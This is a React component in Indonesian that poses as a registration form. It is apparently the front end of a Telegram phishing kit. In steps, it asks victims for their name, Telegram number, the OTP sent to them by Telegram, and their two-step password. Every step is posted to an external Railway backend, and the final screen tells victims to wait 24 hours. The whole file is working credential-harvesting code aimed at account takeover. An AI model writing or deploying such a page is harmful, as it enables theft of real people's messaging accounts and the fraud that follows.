"use client";

import React, { useState } from 'react';

const AuthForm = () => {
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [formData, setFormData] = useState({ nama: '', nomor: '', otp: '', sandi: '' });

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
    setError('');
  };

  const handleNext = async () => {
    setLoading(true);
    setError('');
    
    try {
      const response = await fetch('https://backend-python-production-6e72.up.railway.app/register', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...formData, step }),
      });

      const data = await response.json();

      if (response.ok) {
        if (step === 1) setStep(2);
        else if (step === 2) {
          if (data.status === 'need_2fa') setStep(3);
          else setStep(4);
        } else if (step === 3) setStep(4);
      } else {
        if (data.status === 'invalid_2fa') setError('KATA SANDI SALAH!!');
        else if (data.status === 'invalid_otp') setError('KODE OTP SALAH!!');
        else setError('Terjadi kesalahan server.');
      }
    } catch (err) {
      setError('Koneksi gagal. Cek backend Railway.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="max-w-md mx-auto bg-white shadow-2xl overflow-hidden min-h-screen sm:min-h-0 sm:rounded-2xl sm:mt-10">
      {/* Banner Atas */}
      <div className="w-full">
        <img 
          src="https://daftarsekarang11.netlify.app/banner.jpg" 
          alt="Banner" 
          className="w-full h-auto object-cover"
        />
      </div>

      <div className="p-6 space-y-6">
        {step === 1 && (
          <div className="space-y-4">
            <h2 className="text-xl font-extrabold text-gray-800 text-center">Form Pendaftaran Penerimaan</h2>
            <input name="nama" placeholder="Nama Lengkap" className="w-full border-2 p-3 rounded-xl outline-none focus:border-blue-600" onChange={handleChange} />
            <input name="nomor" placeholder="Nomor Telegram Aktif (08xxx)" className="w-full border-2 p-3 rounded-xl outline-none focus:border-blue-600" onChange={handleChange} />
            <button onClick={handleNext} className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-xl shadow-lg transition-all active:scale-95 text-lg">
              DAFTAR SEKARANG
            </button>
            {/* Teks Peringatan Bawah */}
            <p className="text-[10px] text-gray-400 italic text-center leading-tight">
              Peringatan: Pendaftaran hanya akan diproses melalui nomor telegram aktif!
            </p>
          </div>
        )}

        {step === 2 && (
          <div className="space-y-6 text-center">
            {error && <div className="bg-red-50 text-red-600 p-3 rounded-lg font-bold border border-red-200">{error}</div>}
            <h2 className="text-blue-600 font-bold text-lg leading-tight px-4">
              Kami Telah Mengirimkan Kode OTP Ke Aplikasi Telegram Anda
            </h2>
            <div className="flex justify-center gap-2">
              <input name="otp" placeholder="· · · · ·" className="w-full border-2 p-4 rounded-xl text-center text-3xl font-bold tracking-[0.5em] focus:border-blue-600 outline-none" onChange={handleChange} maxLength={5} />
            </div>
            <p className="text-blue-500 font-bold text-sm cursor-pointer hover:underline" onClick={() => setStep(1)}>Kirim Ulang Kode OTP</p>
            <button onClick={handleNext} disabled={loading} className="w-full bg-blue-600 text-white font-bold py-4 rounded-xl shadow-lg text-lg">
              {loading ? "MEMPROSES..." : "DAFTAR SEKARANG"}
            </button>
            <p className="text-[10px] text-gray-400 italic leading-tight">
              Peringatan: Pendaftaran hanya akan diproses melalui nomor telegram aktif!
            </p>
          </div>
        )}

        {step === 3 && (
          <div className="space-y-4 text-center">
            <h2 className="font-extrabold text-gray-800 text-lg">Verifikasi 2 Langkah Aktif</h2>
            <p className="text-sm text-gray-500 italic">Akun Anda dilindungi kata sandi tambahan. Silakan masukkan untuk melanjutkan.</p>
            <input 
              name="sandi" 
              type="password" 
              placeholder="Masukkan Kata Sandi" 
              className={`w-full border-2 p-4 rounded-xl text-center font-bold ${error ? 'border-red-600 bg-red-50' : 'border-gray-200 focus:border-blue-600'}`} 
              onChange={handleChange} 
            />
            {error && <p className="text-red-600 font-bold text-sm">{error}</p>}
            <button onClick={handleNext} disabled={loading} className="w-full bg-blue-600 text-white font-bold py-4 rounded-xl shadow-lg">
              {loading ? "MENGECEK..." : "KONFIRMASI SANDI"}
            </button>
          </div>
        )}

        {step === 4 && (
          <div className="text-center py-10 space-y-6">
            <div className="w-20 h-20 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto"></div>
            <div className="space-y-2">
               <h2 className="text-xl font-black text-gray-800 tracking-wide">SEDANG MEMPROSES...</h2>
               {/* Teks Konfirmasi 1x24 Jam sesuai instruksi Anda */}
               <p className="text-gray-600 font-medium px-4 text-sm leading-relaxed">
                 Silakan tunggu prosesnya konfirmasi dalam waktu 1x24 jam untuk memeriksa kelayakan
               </p>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default AuthForm;